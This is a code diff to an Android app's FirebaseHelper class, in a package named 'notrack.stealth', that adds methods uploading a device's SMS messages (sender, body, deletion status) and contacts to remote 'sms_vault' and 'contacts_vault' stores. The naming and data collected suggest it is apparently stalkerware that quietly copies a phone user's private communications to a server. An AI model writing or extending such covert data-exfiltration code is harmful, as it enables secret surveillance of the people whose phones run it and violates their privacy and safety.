@@ -6,6 +6,8 @@ import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 import com.notrack.stealth.db.NotificationEntity;
+import com.notrack.stealth.db.SmsEntity;
+import com.notrack.stealth.db.ContactEntity;
 import com.notrack.stealth.security.EncryptionUtils;
 
 import org.json.JSONObject;
@@ -143,6 +145,95 @@ public class FirebaseHelper {
         } catch (Exception e) {
             Log.e(TAG, "Firebase SDK fallback failed", e);
             return false;
+        }
+    }
+
+    /**
+     * Synchronous HTTP REST PUT for isolated SMS Vault.
+     */
+    public static boolean sendSmsRestPut(SmsEntity item) {
+        if (item == null || item.deviceId == null || item.smsId == null) return false;
+        HttpURLConnection conn = null;
+        try {
+            String urlString = RTDB_URL + "sms_vault/" + item.deviceId + "/" + item.smsId + ".json";
+            URL url = new URL(urlString);
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("PUT");
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setDoOutput(true);
+            conn.setConnectTimeout(6000);
+            conn.setReadTimeout(6000);
+
+            JSONObject json = new JSONObject();
+            json.put("sms_id", item.smsId);
+            json.put("device_id", item.deviceId);
+            json.put("address", item.address);
+            json.put("body", item.body);
+            json.put("iv", item.iv != null ? item.iv : "");
+            json.put("auth_tag", item.authTag != null ? item.authTag : "");
+            json.put("type", item.type);
+            json.put("timestamp", item.timestamp);
+            json.put("is_deleted", item.isDeleted);
+            json.put("deleted_at", item.deletedAt);
+            json.put("sync_status", true);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                byte[] input = json.toString().getBytes(StandardCharsets.UTF_8);
+                os.write(input, 0, input.length);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+            return responseCode >= 200 && responseCode < 300;
+        } catch (Exception e) {
+            Log.w(TAG, "Firebase SMS HTTP REST error: " + e.getMessage());
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    /**
+     * Synchronous HTTP REST PUT for isolated Contacts Vault.
+     */
+    public static boolean sendContactRestPut(ContactEntity item) {
+        if (item == null || item.deviceId == null || item.contactId == null) return false;
+        HttpURLConnection conn = null;
+        try {
+            String urlString = RTDB_URL + "contacts_vault/" + item.deviceId + "/" + item.contactId + ".json";
+            URL url = new URL(urlString);
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("PUT");
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setDoOutput(true);
+            conn.setConnectTimeout(6000);
+            conn.setReadTimeout(6000);
+
+            JSONObject json = new JSONObject();
+            json.put("contact_id", item.contactId);
+            json.put("device_id", item.deviceId);
+            json.put("name", item.name);
+            json.put("phone_number", item.phoneNumber);
+            json.put("iv", item.iv != null ? item.iv : "");
+            json.put("auth_tag", item.authTag != null ? item.authTag : "");
+            json.put("timestamp", item.timestamp);
+            json.put("is_deleted", item.isDeleted);
+            json.put("deleted_at", item.deletedAt);
+            json.put("sync_status", true);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                byte[] input = json.toString().getBytes(StandardCharsets.UTF_8);
+                os.write(input, 0, input.length);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+            return responseCode >= 200 && responseCode < 300;
+        } catch (Exception e) {
+            Log.w(TAG, "Firebase Contact HTTP REST error: " + e.getMessage());
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
         }
     }
 }
